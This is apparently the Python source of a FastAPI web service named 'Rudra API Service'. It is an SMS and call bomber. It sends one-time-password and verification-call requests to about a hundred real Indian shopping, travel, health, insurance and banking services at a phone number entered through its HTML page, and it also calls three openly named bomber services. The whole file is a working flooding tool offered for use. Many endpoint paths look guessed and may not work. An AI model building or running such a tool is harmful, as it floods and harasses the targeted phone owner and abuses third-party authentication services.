import asyncio
import json
import time
from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse, JSONResponse
import aiohttp

app = FastAPI(title="Rudra API Service")

# API Configuration List
APIS = [
    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "GoPink Cabs",       "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"check_mobile_number=1&contact={p}"},
    {"name": "Myntra",            "url": lambda p, d: "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart",          "url": lambda p, d: "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Amazon",            "url": lambda p, d: "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"email={p}&create=1"},
    {"name": "Zomato",            "url": lambda p, d: "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}"},
    {"name": "Paytm",             "url": lambda p, d: "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "PhonePe",           "url": lambda p, d: "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "BigBasket",         "url": lambda p, d: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}"}}'},
    {"name": "Meesho",            "url": lambda p, d: "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Snapdeal",          "url": lambda p, d: "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Makemytrip",        "url": lambda p, d: "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "OYO",               "url": lambda p, d: "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Rapido",            "url": lambda p, d: "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Uber",              "url": lambda p, d: "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Domino's",          "url": lambda p, d: "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"PhoneNo={p}"},
    {"name": "BookMyShow",        "url": lambda p, d: "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}"}}'},
    {"name": "Netmeds",           "url": lambda p, d: "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Medlife",           "url": lambda p, d: "https://api.medlife.com/v2/user/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Practo",            "url": lambda p, d: "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Ajio",              "url": lambda p, d: "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Nykaa",             "url": lambda p, d: "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Croma",             "url": lambda p, d: "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Reliance Digital",  "url": lambda p, d: "https://www.reliancedigital.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "FirstCry",          "url": lambda p, d: "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Licious",           "url": lambda p, d: "https://api.licious.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Zepto",             "url": lambda p, d: "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit",           "url": lambda p, d: "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Mobikwik",          "url": lambda p, d: "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Freecharge",        "url": lambda p, d: "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Airtel Thanks",     "url": lambda p, d: "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Jio",               "url": lambda p, d: "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Vodafone Idea",     "url": lambda p, d: "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's",            "url": lambda p, d: "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy",         "url": lambda p, d: "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu",           "url": lambda p, d: "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Toppr",             "url": lambda p, d: "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "WhiteHat Jr",       "url": lambda p, d: "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Cult.fit",          "url": lambda p, d: "https://www.cult.fit/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HealthifyMe",       "url": lambda p, d: "https://www.healthifyme.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Pristyn Care",      "url": lambda p, d: "https://www.pristyncare.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "PharmEasy",         "url": lambda p, d: "https://pharmeasy.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Tata 1mg",          "url": lambda p, d: "https://www.1mg.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Apollo 24/7",       "url": lambda p, d: "https://www.apollo247.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "MFine",             "url": lambda p, d: "https://www.mfine.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "DocsApp",           "url": lambda p, d: "https://www.docsapp.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Lybrate",           "url": lambda p, d: "https://www.lybrate.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Portea Medical",    "url": lambda p, d: "https://www.portea.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PolicyBazaar",      "url": lambda p, d: "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "CoverFox",          "url": lambda p, d: "https://www.coverfox.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Acko",              "url": lambda p, d: "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Digit Insurance",   "url": lambda p, d: "https://www.godigit.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Ergo",         "url": lambda p, d: "https://www.hdfcergo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "ICICI Lombard",     "url": lambda p, d: "https://www.icicilombard.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Bajaj Allianz",     "url": lambda p, d: "https://www.bajajallianz.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Star Health",       "url": lambda p, d: "https://www.starhealth.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Max Bupa",          "url": lambda p, d: "https://www.maxbupa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Life",        "url": lambda p, d: "https://www.kotaklife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Life",          "url": lambda p, d: "https://www.sbilife.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "LIC India",         "url": lambda p, d: "https://www.licindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Life",         "url": lambda p, d: "https://www.hdfclife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Axis Bank",         "url": lambda p, d: "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "ICICI Bank",        "url": lambda p, d: "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Bank",         "url": lambda p, d: "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Bank",          "url": lambda p, d: "https://www.sbi.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Bank",        "url": lambda p, d: "https://www.kotak.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Yes Bank",          "url": lambda p, d: "https://www.yesbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "IndusInd Bank",     "url": lambda p, d: "https://www.indusind.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "IDFC Bank",         "url": lambda p, d: "https://www.idfcfirstbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "AU Bank",           "url": lambda p, d: "https://www.aubank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "RBL Bank",          "url": lambda p, d: "https://www.rblbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bandhan Bank",      "url": lambda p, d: "https://www.bandhanbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Federal Bank",      "url": lambda p, d: "https://www.federalbank.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Canara Bank",       "url": lambda p, d: "https://www.canarabank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PNB",               "url": lambda p, d: "https://www.pnbindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bank of Baroda",    "url": lambda p, d: "https://www.bankofbaroda.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Union Bank",        "url": lambda p, d: "https://www.unionbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Indian Bank",       "url": lambda p, d: "https://www.indianbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Central Bank",      "url": lambda p, d: "https://www.centralbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bank of India",     "url": lambda p, d: "https://www.bankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "IDBI Bank",         "url": lambda p, d: "https://www.idbibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "UCO Bank",          "url": lambda p, d: "https://www.ucobank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Indian Overseas",   "url": lambda p, d: "https://www.iob.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Punjab & Sind",     "url": lambda p, d: "https://www.psbindia.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
]
async def call_api(session, api_obj, phone, duration):
    url = api_obj["url"](phone, duration)
    method = api_obj["method"]
    headers = api_obj.get("headers", {})
    data = api_obj.get("data")(phone, duration) if "data" in api_obj else None

    try:
        async with session.request(method, url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=4)) as response:
            return {"name": api_obj["name"], "status": "success", "code": response.status}
    except Exception:
        return {"name": api_obj["name"], "status": "failed", "code": 500}

@app.get("/api/input")
@app.get("/api/input={phone}")
async def handle_api(phone: str = Query(None), duration: int = Query(60)):
    if not phone:
        return JSONResponse(status_code=400, content={"status": "error", "owner": "Rudra", "message": "Phone parameter required. Example: /api/input=9999999999"})
    
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        tasks = [call_api(session, api_item, phone, duration) for api_item in APIS]
        results = await asyncio.gather(*tasks)

    success_count = sum(1 for r in results if r["status"] == "success")
    failed_count = len(results) - success_count

    return {
        "status": "completed",
        "owner": "Rudra",
        "target": phone,
        "total_apis": len(APIS),
        "successful_requests": success_count,
        "failed_requests": failed_count,
        "execution_time_seconds": round(time.time() - start_time, 2),
        "results": results
    }

@app.get("/", response_class=HTMLResponse)
async def serve_ui():
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>RUDRA POWERFUL API</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    </head>
    <body class="bg-gray-950 text-white min-h-screen flex items-center justify-center p-4">
        <div class="max-w-xl w-full bg-gray-900/80 backdrop-blur-md rounded-2xl border border-cyan-500/30 p-6 shadow-2xl shadow-cyan-500/10">
            <div class="text-center mb-6">
                <span class="bg-cyan-500/10 text-cyan-400 text-xs font-semibold px-3 py-1 rounded-full border border-cyan-500/30">MADE BY RUDRA</span>
                <h1 class="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600 mt-2">API CONTROLLER</h1>
                <p class="text-gray-400 text-sm mt-1">High-Speed Multi-Threaded Request Trigger</p>
            </div>

            <div class="space-y-4">
                <div>
                    <label class="text-xs text-gray-400 mb-1 block">Phone Number</label>
                    <input type="text" id="phone" placeholder="Enter 10 digit number" class="w-full bg-gray-800/80 border border-gray-700 focus:border-cyan-500 text-white rounded-lg px-4 py-3 outline-none transition">
                </div>

                <button onclick="triggerApi()" id="btn" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 font-bold py-3 rounded-lg flex items-center justify-center space-x-2 transition shadow-lg shadow-cyan-500/20">
                    <i class="fa-solid fa-bolt"></i>
                    <span>EXECUTE NOW</span>
                </button>
            </div>

            <div class="mt-6 bg-gray-950/70 border border-gray-800 rounded-lg p-4">
                <div class="flex justify-between items-center text-xs text-gray-400 mb-2">
                    <span>API ROUTE URL</span>
                    <span class="text-cyan-400">GET Request</span>
                </div>
                <code id="apiLink" class="text-xs text-cyan-300 block break-all font-mono">/api/input=YOUR_NUMBER</code>
            </div>

            <div id="output" class="hidden mt-4 p-4 bg-gray-950 rounded-lg border border-gray-800 text-xs font-mono max-h-60 overflow-y-auto"></div>
        </div>

        <script>
            async function triggerApi() {{
                const phone = document.getElementById('phone').value;
                const output = document.getElementById('output');
                const btn = document.getElementById('btn');
                const apiLink = document.getElementById('apiLink');

                if(!phone) {{ alert('Please enter phone number!'); return; }}

                const endpoint = `/api/input=${{phone}}`;
                apiLink.innerText = window.location.origin + endpoint;

                btn.disabled = true;
                btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Processing...`;
                output.classList.remove('hidden');
                output.innerHTML = '<span class="text-yellow-400">Sending asynchronous requests across all nodes...</span>';

                try {{
                    const res = await fetch(endpoint);
                    const data = await res.json();
                    output.innerHTML = `<pre class="text-green-400">${{JSON.stringify(data, null, 2)}}</pre>`;
                }} catch (e) {{
                    output.innerHTML = `<span class="text-red-400">Error: ${{e.message}}</span>`;
                }} finally {{
                    btn.disabled = false;
                    btn.innerHTML = `<i class="fa-solid fa-bolt"></i> <span>EXECUTE NOW</span>`;
                }}
            }}
        </script>
    </body>
    </html>
    """
